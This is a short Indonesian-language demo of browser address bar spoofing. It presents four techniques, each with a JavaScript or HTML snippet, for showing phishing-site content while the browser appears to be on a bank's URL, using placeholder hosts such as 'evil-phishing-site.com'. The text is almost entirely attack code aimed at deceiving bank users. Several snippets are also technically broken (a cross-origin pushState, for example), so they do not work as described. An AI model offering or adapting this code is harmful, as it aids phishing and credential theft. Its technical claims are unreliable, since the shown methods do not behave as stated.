Address Bar Spoofing - Demo Konsep

Teknik 1: Navigation Timing Attack

Memanfaatkan timing saat navigasi untuk membuat address bar tidak update:

Kode yang digunakan:

// Buat iframe tersembunyi
let iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = 'https://trusted-bank.com';

// Setelah load, ganti konten tanpa update address bar
iframe.onload = () => {
    window.location.replace('https://evil-site.com');
};

Teknik 2: Meta Refresh Race Condition

Menggunakan meta refresh dengan timing khusus:

Kode yang digunakan:

<meta http-equiv="refresh" 
      content="0;url=javascript:window.location='evil.com'">

Teknik 3: History Manipulation

Memanipulasi browser history untuk confusion:

Kode yang digunakan:

// Push state untuk URL legitimate
history.pushState({}, '', 'https://trusted-bank.com');

// Tapi load konten dari evil site
fetch('https://evil-phishing-site.com')
    .then(r => r.text())
    .then(html => document.body.innerHTML = html);

Teknik 4: Window.open dengan Feature Detection

Kode yang digunakan:

// Buka window baru
let win = window.open('https://legitimate-bank.com', '_blank');

// Setelah load, ganti dengan konten jahat
setTimeout(() => {
    win.location = 'https://phishing-site.com';
}, 100);
